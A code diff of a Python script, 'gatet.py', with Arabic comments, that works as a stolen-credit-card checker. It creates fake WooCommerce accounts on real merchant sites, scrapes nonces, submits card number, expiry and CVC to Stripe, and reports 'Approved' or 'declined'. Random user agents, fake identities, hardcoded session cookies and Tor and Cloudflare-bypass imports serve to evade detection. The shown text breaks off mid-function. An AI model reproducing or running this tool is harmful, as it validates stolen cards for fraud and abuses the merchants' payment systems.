@@ -1,489 +1,544 @@
-# ==================== gatet.py (النسخة الجديدة لموقع RelentlessDefender) ====================
+# ==================== gatet.py (نسخة PayPal/Braintree مع الديناميكيات فقط) ====================
 
-import requests, json, re, random, sys, os, time, base64, uuid
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-from user_agent import generate_user_agent
+import os, sys
+import random
+import telebot
+import requests, random, time, string, base64
 from bs4 import BeautifulSoup
-import string
+import os, json
+import base64
+from telebot import types
+import time, requests
+from re import findall
+import re
+import json
+import threading
+import uuid
+import socks
+import socket
+from stem import Signal
+from stem.control import Controller
+from faker import Faker
+import cloudscraper
+import subprocess
+from user_agent import generate_user_agent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from datetime import datetime
+import urllib3
 
-def clean_html(text):
-    if not text:
-        return ""
-    clean = re.sub(r'<[^>]+>', ' ', text)
-    clean = re.sub(r'\s+', ' ', clean)
-    return clean.strip().lower()
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def extract_reason(text):
-    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
-    if match:
-        return match.group(1).strip()
-    return None
+# ================ إعدادات الديناميكية ================
+def get_random_user_agent():
+    """تجيب User-Agent عشوائي من المكتبة"""
+    return generate_user_agent()
 
-def generate_valid_us_data():
-    """توليد بيانات عنوان أمريكي صالح"""
+def get_random_ip():
+    """تولد IP عشوائي (للهيدر بس، مش تغيير حقيقي للـ IP)"""
+    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+
+def generate_random_email(domain=None):
+    """تولد إيميل عشوائي مع دومينات متعددة"""
+    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
+    if not domain:
+        domain = random.choice(domains)
+    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
+    number = random.randint(10, 9999)
+    return f"{name}{number}@{domain}"
+
+def generate_random_name():
+    """تولد اسم عشوائي"""
     first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
-                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
-                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Hoane', 'Kosi']
+                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
     last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
-                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
-                  'Caril', 'Hatleyb', 'Payne', 'Betran', 'Vane']
-    
-    first = random.choice(first_names)
-    last = random.choice(last_names)
-    
-    us_states = ['CA', 'TX', 'FL', 'NY', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI', 'NJ', 'VA', 'WA', 'AZ', 'MA', 'TN', 'IN', 'MO', 'MD', 'WI']
-    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin', 'Rotherham']
-    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301']
-    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '12038783117', '441709382815']
-    us_addresses = ['1 Rowe Ave', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive', '653 Broom Valley Rd']
-    
-    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
-    email_domain = random.choice(email_domains)
-    
-    return {
-        'first_name': first,
-        'last_name': last,
-        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
-        'phone': random.choice(us_phones),
-        'address_1': random.choice(us_addresses),
-        'city': random.choice(us_cities),
-        'state': random.choice(us_states),
-        'postcode': random.choice(us_postcodes),
-        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
-    }
+                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
+    return random.choice(first_names), random.choice(last_names)
 
-def ch(ccx):
-    print("\n" + "="*70)
-    print("[DEBUG] STARTING NEW CHECK - RelentlessDefender")
-    print("="*70)
-    
+def generate_random_postal():
+    """تولد رمز بريدي عشوائي (UK)"""
+    postal_codes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ',
+                    'YO18SU', 'CA56NA', 'PL28EQ', 'PR253NE', 'NE304QB']
+    return random.choice(postal_codes)
+
+def generate_random_phone():
+    """تولد رقم تليفون عشوائي UK"""
+    prefixes = ['077', '078', '079', '074', '075', '076']
+    return f"{random.choice(prefixes)}{random.randint(1000000, 9999999)}"
+
+# ================ الدوال الأساسية (زي ما هي من غير تعديل) ================
+
+def brn6(ccx):
+    import requests
     ccx = ccx.strip()
-    n = ccx.split("|")[0]
+    c = ccx.split("|")[0]
     mm = ccx.split("|")[1]
     yy = ccx.split("|")[2]
     cvc = ccx.split("|")[3]
+    if "20" in yy:
+        yy = yy.split("20")[1]
     
-    if len(yy) == 2:
-        yy = '20' + yy
+    # ✅ User-Agent ديناميكي
+    user = get_random_user_agent()
     
-    user = generate_user_agent()
-    fake_data = generate_valid_us_data()
-    session_id = str(uuid.uuid4())
-    correlation_id = str(uuid.uuid4())[:24]
     r = requests.session()
+    r = requests.session()
+    user = get_random_user_agent()
     
-    print(f"[1/6] Using User-Agent: {user[:50]}...")
-    print(f"[1/6] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
+    x = random.randrange(0, 9999)
+    s = random.randrange(10, 1000)
     
-    # ================ القيم الثابتة من الريكويستات الجديدة ================
-    CT_SFW_PASS_KEY = 'd81045e636fbb2be458a59812d20ba0e0'
-    CT_CHECKJS = '412784006'
-    APBCT_VISIBLE_FIELDS = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoicXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6InlpdGhfd2Fwb19wcm9kdWN0X2lkIHlpdGhfd2Fwb19wcm9kdWN0X2ltZyB5aXRoX3dhcG9faXNfc2luZ2xlIF93cG5vbmNlIF93cF9odHRwX3JlZmVyZXIiLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo1fX0='
-    WOOCOMMERCE_SESSION = 't_775edb8b89b4d59cddb32964c2902e%7C1779459401%7C1779373001%7C%24generic%24OIh-myRTOnd-tkGHNPNqlDIJXvOR81QujysCRbGH'
+    r = requests.Session()
+    user = get_random_user_agent()
     
-    # ================ 1. ADD TO CART ================
-    print("\n[2/6] Adding product to cart...")
-    
-    product_url = 'https://relentlessdefender.com/product/relentless-defender-koozie/'
-    
-    cookies_add = {
-        'apbct_site_landing_ts': '1779286498',
-        'apbct_site_referer': '0',
-        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
-        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'ct_checkjs': CT_CHECKJS,
-        'ct_timezone': '3',
-        'apbct_headless': 'false',
-        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
-        'ct_mouse_moved': 'true',
-        'commercekit-nonce-value': '72c25b68de',
-        'commercekit-nonce-state': '0',
-        '_fbp': 'fb.1.1779286506441.457161318630096402',
-        'ct_has_scrolled': 'true',
-        'apbct_prev_referer': 'https%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
-        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
-        'commercekit_obp_view_ids': '789360%2C822232',
-        'ct_ps_timestamp': '1779286618',
-        'apbct_page_hits': '10',
-        'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
-        'ct_pointer_data': '%5B%5D',
-        'ct_fkp_timestamp': '1779286660',
-    }
-    
-    files = {
-        'yith_wapo_product_id': (None, '785'),
-        'yith_wapo_product_img': (None, ''),
-        'yith_wapo_is_single': (None, '1'),
-        '_wpnonce': (None, '47574b9e99'),
-        '_wp_http_referer': (None, '/product/relentless-defender-koozie/'),
-        'quantity': (None, '1'),
-        'add-to-cart': (None, '785'),
-        'apbct_visible_fields': (None, APBCT_VISIBLE_FIELDS),
-    }
-    
-    headers_add = {
-        'authority': 'relentlessdefender.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-        'accept-language': 'en-US,en;q=0.9',
-        'origin': 'https://relentlessdefender.com',
-        'referer': product_url,
-        'user-agent': user,
-        'upgrade-insecure-requests': '1',
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
-    }
-    
-    response = r.post(product_url, headers=headers_add, files=files, cookies=cookies_add)
-    print(f"[2/6] Add to cart status: {response.status_code}")
-    
-    if response.status_code != 200:
-        return f'ADD_TO_CART_FAILED'
-    
-    # ================ 2. CHECKOUT PAGE ================
-    print("\n[3/6] Accessing checkout page...")
-    
-    cookies_checkout = {
-        'apbct_site_landing_ts': '1779286498',
-        'apbct_site_referer': '0',
-        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
-        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'ct_checkjs': CT_CHECKJS,
-        'ct_timezone': '3',
-        'apbct_headless': 'false',
-        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
-        'ct_mouse_moved': 'true',
-        'commercekit-nonce-value': '72c25b68de',
-        'commercekit-nonce-state': '0',
-        '_fbp': 'fb.1.1779286506441.457161318630096402',
-        'ct_has_scrolled': 'true',
-        'apbct_prev_referer': 'https%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
-        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
-        'commercekit_obp_view_ids': '789360%2C822232',
-        'woocommerce_items_in_cart': '1',
-        'woocommerce_cart_hash': '37f96722f99c851ece19427eef0dafe0',
-        'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
-        'ct_pointer_data': '%5B%5D',
-        'ct_ps_timestamp': '1779286700',
-        'apbct_page_hits': '14',
-    }
-    
-    headers_checkout = {
-        'authority': 'relentlessdefender.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-        'accept-language': 'en-US,en;q=0.9',
-        'referer': product_url,
-        'user-agent': user,
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+        'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    response = r.get('https://calefs.com/', headers=headers)
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'referer': 'https://calefs.com/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
     }
     
-    response = r.get('https://relentlessdefender.com/checkout/', headers=headers_checkout, cookies=cookies_checkout)
-    print(f"[3/6] Checkout page status: {response.status_code}")
+    response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)
     
-    if response.status_code != 200:
-        return f'CHECKOUT_PAGE_FAILED'
+    nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
     
-    # ================ 3. EXTRACT TOKENS AND NONCES ================
-    print("\n[4/6] Extracting tokens and nonces...")
+    # ✅ إيميل ديناميكي
+    dynamic_email = generate_random_email()
     
-    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
-    if not sec:
-        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
-    if sec:
-        sec = sec.group(1)
-        print(f"[4/6] Found update_order_review nonce: {sec[:20]}...")
-    else:
-        print("[4/6] WARNING: Could not find update_order_review nonce")
-        sec = '951c414ed0'
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://calefs.com',
+        'referer': 'https://calefs.com/my-account/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
     
-    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
-    if not check_nonce:
-        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
-    if check_nonce:
-        check_nonce = check_nonce.group(1)
-        print(f"[4/6] Found checkout nonce: {check_nonce[:20]}...")
-    else:
-        print("[4/6] WARNING: Could not find checkout nonce")
-        check_nonce = '6607b26b34'
+    data = {
+        'email': f'y7is61{x}{c}@{random.choice(["gmail.com", "yahoo.com", "hotmail.com"])}',
+        'wc_order_attribution_source_type': 'typein',
+        'wc_order_attribution_referrer': '(none)',
+        'wc_order_attribution_utm_campaign': '(none)',
+        'wc_order_attribution_utm_source': '(direct)',
+        'wc_order_attribution_utm_medium': '(none)',
+        'wc_order_attribution_utm_content': '(none)',
+        'wc_order_attribution_utm_id': '(none)',
+        'wc_order_attribution_utm_term': '(none)',
+        'wc_order_attribution_utm_source_platform': '(none)',
+        'wc_order_attribution_utm_creative_format': '(none)',
+        'wc_order_attribution_utm_marketing_tactic': '(none)',
+        'wc_order_attribution_session_entry': 'https://calefs.com/',
+        'wc_order_attribution_session_pages': '4',
+        'wc_order_attribution_session_count': '1',
+        'wc_order_attribution_user_agent': user,
+        'woocommerce-register-nonce': nonce,
+        '_wp_http_referer': '/my-account/',
+        'register': 'Register',
+    }
     
-    # ================ 4. UPDATE ORDER REVIEW ================
-    print("\n[5/6] Updating order review...")
+    response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
     
-    headers_update = {
-        'authority': 'relentlessdefender.com',
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'referer': 'https://calefs.com/my-account/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user
+    }
+    
+    response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'referer': 'https://calefs.com/my-account/payment-methods/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+    pay = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+    key = re.search(r'"key"\s*:\s*"([^"]+)"', response.text).group(1)
+    
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': user,
+    }
+    
+    data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
+    
+    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    id = response.json()['id']
+    
+    headers = {
+        'authority': 'calefs.com',
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://relentlessdefender.com',
-        'referer': 'https://relentlessdefender.com/checkout/',
+        'origin': 'https://calefs.com',
+        'referer': 'https://calefs.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
         'user-agent': user,
         'x-requested-with': 'XMLHttpRequest',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
     }
     
-    params_update = {'wc-ajax': 'update_order_review'}
+    data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': pay,
+    }
     
-    data_update = f'security={sec}&payment_method=braintree_cc&country=&state=&postcode=&city=&address=&address_2=&s_country=&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Frelentlessdefender.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2026-05-20%252014%253A15%253A00%26wc_order_attribution_session_pages%3D11%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3D%26billing_address_1%3D%26billing_address_2%3D%26billing_city%3D%26billing_state%3D%26billing_postcode%3D%26billing_phone%3D%26billing_email%3D%26wc_apbct_email_id%3D%26bb30e59%3D0%26bb30e59%3D1%26e038059%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout%252F'
+    response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+    if '"success":true,"data":{"status":"succeeded"' in response.text:
+        return 'Approved'
+    else:
+        return 'declined'
+
+
+# ==================== إعدادات الموقع الجديد (Oking Foundation) ====================
+SITE_URL = 'https://www.theflorentine.net/support-the-florentine/'
+URL_AJAX = 'https://www.theflorentine.net/wp-admin/admin-ajax.php'
+
+def extract_data():
+    s = requests.Session()
+    s.verify = False
+    ua = get_random_user_agent()
+    headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
+    r = s.get(SITE_URL, headers=headers, timeout=30)
+    html = r.text
     
-    response = r.post('https://relentlessdefender.com/', params=params_update, headers=headers_update, data=data_update)
-    print(f"[5/6] Update order review status: {response.status_code}")
+    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
+    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
     
-    # ================ 5. TOKENIZE CREDIT CARD ================
-    print("\n[6/6] Tokenizing credit card...")
+    if not all([fp, fi, nc]):
+        return None
+        
+    enc = re.search(r'"data-client-token":"(.*?)"', html)
+    if not enc:
+        return None
+        
+    dec = base64.b64decode(enc.group(1)).decode('utf-8')
+    au = re.search(r'"accessToken":"(.*?)"', dec)
     
-    # استخراج الـ authorization fingerprint من الـ response
-    au = None
-    client_token_match = re.search(r'data-client-token="([^"]+)"', response.text)
-    if not client_token_match:
-        client_token_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\]', response.text)
-    
-    if client_token_match:
-        client_token = client_token_match.group(1)
-        print(f"[6/6] Found client token, decoding...")
-        try:
-            dec = base64.b64decode(client_token).decode('utf-8')
-            au_match = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
-            if au_match:
-                au = au_match.group(1)
-                print(f"[6/6] Got authorization fingerprint: {au[:50]}...")
-        except:
-            pass
-    
-    # إذا لم نجد الـ fingerprint، نستخدم القيمة الثابتة من الريكويستات
     if not au:
